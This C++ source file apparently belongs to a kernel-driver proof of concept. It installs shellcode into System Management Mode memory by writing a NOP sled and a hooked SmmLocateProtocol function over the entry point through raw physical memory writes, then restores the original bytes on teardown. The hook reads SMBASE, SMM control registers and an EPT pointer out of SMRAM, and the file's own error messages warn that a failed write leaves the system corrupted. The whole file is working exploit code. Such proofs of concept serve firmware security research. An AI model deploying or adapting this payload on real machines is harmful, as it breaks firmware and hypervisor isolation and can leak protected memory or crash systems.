#include "SmmShellCode.hpp"

//
// UEFI
//
#define EFIAPI __cdecl
typedef UINT64 UINTN;
typedef UINTN RETURN_STATUS;
typedef RETURN_STATUS EFI_STATUS;
typedef GUID EFI_GUID;
#define EFI_SECURITY_VIOLATION    (0x8000000000000000ULL | 26)

//
// EFI_LOCATE_PROTOCOL
//
static
EFI_STATUS
EFIAPI
HookedSmmLocateProtocol (
    EFI_GUID* Protocol,
    PVOID Registration,
    PVOID* Interface
    )
{
    HOOKED_SMM_LOCATE_PROTOCOL_PARAMETER_BLOCK* block;

    UNREFERENCED_PARAMETER(Protocol);
    UNREFERENCED_PARAMETER(Registration);
    UNREFERENCED_PARAMETER(Interface);

    block = static_cast<HOOKED_SMM_LOCATE_PROTOCOL_PARAMETER_BLOCK*>(nullptr);

    block->Smbase = __readmsr(0x9e);
    block->SmmFeatureControl = __readmsr(0x4e0);
    block->SmmMcaCap = __readmsr(0x17d);

    //
    // Setting of "enable EPT" VM-execution control
    //
    if ((*static_cast<PULONG32>(Add2Ptr(block->Smbase, 0x8000 + 0x7EE0)) & 1) == 1)
    {
        block->Eptp = *static_cast<PULONG64>(Add2Ptr(block->Smbase, 0x8000 + 0x7ED8));
    }
    else
    {
        block->Eptp = MAXULONG64;
    }

    return EFI_SECURITY_VIOLATION;
}

static void HookedSmmLocateProtocolZZZ() {}

SmmShellCode::SmmShellCode (
    ) :
    m_FunctionSize(reinterpret_cast<ULONG64>(HookedSmmLocateProtocolZZZ) -
        reinterpret_cast<ULONG64>(HookedSmmLocateProtocol)),
    m_ShellCodeSize(k_NopSledSize + m_FunctionSize)
{
}

NTSTATUS
SmmShellCode::Install (
    const PhysicalMemory& Pm
    )
{
    NTSTATUS status;
    PVOID originalCode;
    UCHAR nops[k_NopSledSize];

    originalCode = ExAllocatePoolWithTag(NonPagedPoolNx, m_ShellCodeSize, k_PoolTag);
    if (originalCode == nullptr)
    {
        DEMO_ERROR("Memory allocation failed");
        status = STATUS_INSUFFICIENT_RESOURCES;
        goto Exit;
    }

    status = Pm.Read(originalCode, k_ShellCodeEntryPoint, m_ShellCodeSize);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("Read failed : %08x", status);
        goto Exit;
    }

    RtlFillMemory(nops, sizeof(nops), 0x90);
    status = Pm.Write(k_ShellCodeEntryPoint, nops, sizeof(nops));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("Write failed : %08x", status);
        goto Exit;
    }

    status = Pm.Write(k_ShellCodeAddress, reinterpret_cast<PVOID>(HookedSmmLocateProtocol), m_FunctionSize);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("Write failed. System left corrupted : %08x", status);
        goto Exit;
    }

    m_OriginalCode = originalCode;
    m_Pm = &Pm;

Exit:
    if (!NT_SUCCESS(status))
    {
        if (originalCode != nullptr)
        {
            ExFreePoolWithTag(originalCode, k_PoolTag);
        }
    }
    return status;
}

SmmShellCode::~SmmShellCode (
    )
{
    if (m_OriginalCode != nullptr)
    {
        NTSTATUS status;

        status = m_Pm->Write(k_ShellCodeEntryPoint, m_OriginalCode, m_ShellCodeSize);
        if (!NT_SUCCESS(status))
        {
            DEMO_ERROR("Write failed. System left corrupted : %08x", status);
        }
        ExFreePoolWithTag(m_OriginalCode, k_PoolTag);
    }
}

